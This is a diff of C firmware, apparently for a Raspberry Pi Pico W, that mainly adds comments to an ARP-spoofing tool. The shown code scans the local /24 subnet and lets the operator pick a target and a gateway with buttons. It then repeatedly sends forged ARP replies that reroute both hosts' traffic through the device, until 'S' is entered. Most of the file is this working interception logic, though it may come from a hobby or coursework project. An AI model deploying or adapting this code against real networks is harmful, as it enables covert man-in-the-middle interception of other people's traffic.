@@ -16,9 +16,10 @@
 #include "lwip/udp.h"
 #include "lwip/tcp.h"
 
-// Define the Ethernet ethertype for ARP
+// Define the Ethernet ethertype for ARP.
 #define ARP_PROTOCOL 0x0806
 
+// These can be removed, but I'm leaving it in in case I need to ping something.
 #ifndef PING_ADDR
 #define PING_ADDR "192.168.19.240"
 #endif
@@ -29,27 +30,27 @@
 
 #define TEST_TASK_PRIORITY (tskIDLE_PRIORITY + 1UL)
 
-// Define GPIO pins for buttons
+// Define GPIO pins for buttons.
 #define BUTTON_UP_PIN 20
 #define BUTTON_DOWN_PIN 21
 #define BUTTON_SELECT_PIN 22
 
 int selectedEntry = 0;
 
-// Structure to store IP and MAC addresses
+// Structure to store IP and MAC addresses.
 struct EntryInfo {
     ip4_addr_t ipaddr;
     struct eth_addr ethaddr;
 };
 
-// Arrays to store targetEntry and targetGateway info
+// Arrays to store targetEntry and targetGateway info.
 struct EntryInfo targetEntryInfo;
 struct EntryInfo targetGatewayInfo;
 
-// Callback function when a button is pressed
+// Callback function when a button is pressed.
 static void button_isr(uint gpio, uint32_t events)
 {
-    // For some reason having 2 ISR didn't work, so sticking to one
+    // For some reason having 2 ISR didn't work, so sticking to one with an If and else if to use the buttons.
     if (gpio == BUTTON_UP_PIN)
     {
         selectedEntry++;
@@ -59,7 +60,7 @@ static void button_isr(uint gpio, uint32_t events)
         selectedEntry--;
     }
 }
-
+// The function to connect to the WIFI network selected.
 void connectWIFI()
 {
     if (cyw43_arch_init()) 
@@ -67,12 +68,15 @@ void connectWIFI()
         printf("** Failed to initialize **\n");
         return;
     }
+    
     cyw43_arch_enable_sta_mode();
+    
     printf("Connecting to Wi-Fi...\n");
-
+    
+    // While loop to infinitely try to reconnect to the selected WIFI every 15 seconds.
     while (cyw43_arch_wifi_connect_timeout_ms(WIFI_SSID, WIFI_PASSWORD, CYW43_AUTH_WPA2_AES_PSK, 15000)) 
     {
-        // Failed to connect, retry after a delay
+        // Failed to connect, retry after a delay.
         printf("Failed to connect. Retrying in 15 seconds...\n");
         vTaskDelay(15000 / portTICK_PERIOD_MS);
     }
@@ -85,7 +89,10 @@ int selectEntry(struct netif *netif, int arpEntries, int prevChoice)
 {
     int prevEntry = prevChoice;
     int chosenEntry = -1;
-    int selectedEntries[arpEntries]; // An array to track selected entries
+    
+    // An array to track selected entries.
+    int selectedEntries[arpEntries];
+    
     int selectedCount = 0;
     ip4_addr_t *ipaddr;
     struct eth_addr *ethaddr;
@@ -104,9 +111,10 @@ int selectEntry(struct netif *netif, int arpEntries, int prevChoice)
         }
     }
 
+    // Mostly code for selecting a target and the gateway, along with validation to ensure they don't select the same ones.
     while (1) 
     {
-        // Ensure the selected entry is within the valid range
+        // Ensure the selected entry is within the valid range.
         if (selectedEntry < 0) 
         {
             selectedEntry = arpEntries - 1;
@@ -116,7 +124,7 @@ int selectEntry(struct netif *netif, int arpEntries, int prevChoice)
             selectedEntry = 0;
         }
 
-        // Check if the selection has changed
+        // Check if the selection has changed.
         if (selectedEntry != prevEntry && selectedEntry != prevChoice) 
         {
             if (etharp_get_entry(selectedEntry, &ipaddr, &netif, &ethaddr)) 
@@ -132,10 +140,10 @@ int selectEntry(struct netif *netif, int arpEntries, int prevChoice)
             selectedEntry = prevEntry;
         }
 
-        // Check if the button 'Select' is pressed
+        // Check if the Select button has been pressed.
         if (gpio_get(BUTTON_SELECT_PIN) == 0) 
         {
-            // Check if the selected entry has not been selected before
+            // Check if the selected entry has not been selected before.
             int isAlreadySelected = 0;
             for (int i = 0; i < selectedCount; i++) 
             {
@@ -147,7 +155,7 @@ int selectEntry(struct netif *netif, int arpEntries, int prevChoice)
             }
             if (!isAlreadySelected) 
             {
-                // Add the selected entry to the selectedEntries array
+                // Add the selected entry to the selectedEntries array.
                 selectedEntries[selectedCount] = selectedEntry;
                 selectedCount++;
 
@@ -160,7 +168,7 @@ int selectEntry(struct netif *netif, int arpEntries, int prevChoice)
     return -1;
 }
 
-
+// Modified function from etharp's default library.
 /* Parameters:
 * netif – the lwip network interface on which to send the ARP packet (Just use the default one, &cyw43_state.netif[0])
 * ethsrc_addr – the source MAC address for the ethernet header (Put your own MAC here)
@@ -182,19 +190,20 @@ void send_arp_reply(struct netif *netif, const struct eth_addr *ethsrc_addr,
     }
 }
 
+// Main function.
 void main_task(__unused void *params) 
 {
     connectWIFI();
 
-    // Get the device's IP address
+    // Get the device's IP address.
     struct netif* netif = &cyw43_state.netif[0];
     ip_addr_t ip = netif->ip_addr;
 
-    // Set device_mac using the MAC address of the netif
+    // Set device_mac using the MAC address of the netif.
     struct eth_addr device_mac;
     SMEMCPY(&device_mac, netif->hwaddr, ETH_HWADDR_LEN);
 
-    // Get the first three octets from the device's IP address
+    // Get the first three octets from the device's IP address for the network scan later.
     uint8_t octet1 = ip4_addr1_16(&ip);
     uint8_t octet2 = ip4_addr2_16(&ip);
     uint8_t octet3 = ip4_addr3_16(&ip);
@@ -208,30 +217,33 @@ void main_task(__unused void *params)
     
     struct eth_addr *ethaddr;
 
+    // Printing out the device information like IP and MAC address.
     printf("\nDevice IP: %u.%u.%u.%u\n", octet1, octet2, octet3, ip4_addr4_16(&ip));
     printf("Device MAC: %02X:%02X:%02X:%02X:%02X:%02X\n\n", device_mac.addr[0], device_mac.addr[1], 
     device_mac.addr[2], device_mac.addr[3], device_mac.addr[4], device_mac.addr[5]);    
-    
+
+    // Scanning the network the device is on, assuming that the subnet mask is /24.
     printf("Scanning the network...\n");
+    
     for (int i = 0; i <=255; i++) 
     {
         ip_addr_t target_ip;
         uint8_t octet4 = i & 0xFF;
         IP4_ADDR(ip_2_ip4(&target_ip), octet1, octet2, octet3, octet4);
 
-        // Preparing the ARP request
+        // Preparing the ARP request.
         etharp_request(&cyw43_state.netif[0], &target_ip);
 
-        // Delay a bit, 25 seems fine
+        // Slight delay to not flood traffic.
         vTaskDelay(25 / portTICK_PERIOD_MS);
     }
 
-    // Prints out all ARP table entries
+    // Prints out all ARP table entries received from devices on the network.
     for (entry_index = 0; entry_index <= ARP_TABLE_SIZE; entry_index++) 
     {
         if (etharp_get_entry(entry_index, &ipaddr, &netif, &ethaddr)) 
         {
-            // Print or use the information from the ARP table entry
+            // Print or use the information from the ARP table entry.
             printf("Entry %d: IP Address: %s, Interface: %s, MAC Address: %02X:%02X:%02X:%02X:%02X:%02X\n",
                 entry_index, ip4addr_ntoa(ipaddr), netif->name, ethaddr->addr[0], ethaddr->addr[1],
                 ethaddr->addr[2], ethaddr->addr[3], ethaddr->addr[4], ethaddr->addr[5]);
@@ -239,10 +251,11 @@ void main_task(__unused void *params)
         }
     }   
 
-    // Configure the GPIO pins for interrupt generation on the falling edge
+    // Enable the GPIO pins for interrupt generation on the falling edge.
     gpio_set_irq_enabled_with_callback(BUTTON_UP_PIN, GPIO_IRQ_EDGE_FALL, true, &button_isr);   
     gpio_set_irq_enabled_with_callback(BUTTON_DOWN_PIN, GPIO_IRQ_EDGE_FALL, true, &button_isr);
 
+    // Selecting a target.
     printf("\nSelect the Target: Press 'Up'(20) and 'Down'(21) buttons to select an entry. Press 'Select'(22) to confirm.\n");
     targetEntry = selectEntry(netif, arpEntries, targetEntry);
 
@@ -263,6 +276,7 @@ void main_task(__unused void *params)
         printf("Selection canceled or invalid.\n");
     }
 
+    // Selecting a gateway.
     printf("\nSelect the Gateway: Press 'Up'(20) and 'Down'(21) buttons to select an entry. Press 'Select'(22) to confirm.\n");
     targetGateway = selectEntry(netif, arpEntries, targetEntry);
         
@@ -281,12 +295,18 @@ void main_task(__unused void *params)
     {
         printf("Selection canceled or invalid.\n");
     }
-
+    // Disabling the buttons.
     gpio_set_irq_enabled_with_callback(BUTTON_UP_PIN, GPIO_IRQ_EDGE_FALL, false, &button_isr);   
     gpio_set_irq_enabled_with_callback(BUTTON_DOWN_PIN, GPIO_IRQ_EDGE_FALL, false, &button_isr);
 
+
+    // Infinite loop when the PICO doesn't receive a 'S' char.
     while(getchar_timeout_us(0) != 'S')
     {
+        // If the ARP entry exists, sends a ARP stating that the MAC address of the selected device is actually at the Receiver Pico.
+        // This causes the target and gateway to send their traffic to the Receiver instead of each other.
+
+        // Sending the ARP to the target.
         if (etharp_get_entry(targetEntry, &ipaddr, &netif, &ethaddr)) 
         {
             printf("Sending ARP to Target: %d, IP Address: %s, MAC Address: %02X:%02X:%02X:%02X:%02X:%02X\n",
@@ -295,6 +315,7 @@ void main_task(__unused void *params)
             send_arp_reply(&cyw43_state.netif[0], &device_mac, ethaddr, &device_mac, &targetGatewayInfo.ipaddr, &device_mac, &ip);
         }
 
+        // Sending the ARP to the receiver.
         if (etharp_get_entry(targetGateway, &ipaddr, &netif, &ethaddr)) 
         {
             printf("Sending ARP to Gateway: %d, IP Address: %s, MAC Address: %02X:%02X:%02X:%02X:%02X:%02X\n\n",
@@ -303,6 +324,8 @@ void main_task(__unused void *params)
             send_arp_reply(&cyw43_state.netif[0], &device_mac, ethaddr, &device_mac, &targetEntryInfo.ipaddr, &device_mac, &ip);
         }
         printf("Enter 'S' into the serial monitor to stop spoofing.\n");
+
+        // Sleep for 2 seconds to not flood the network.
         sleep_ms(2000);
     }
     cyw43_arch_deinit();
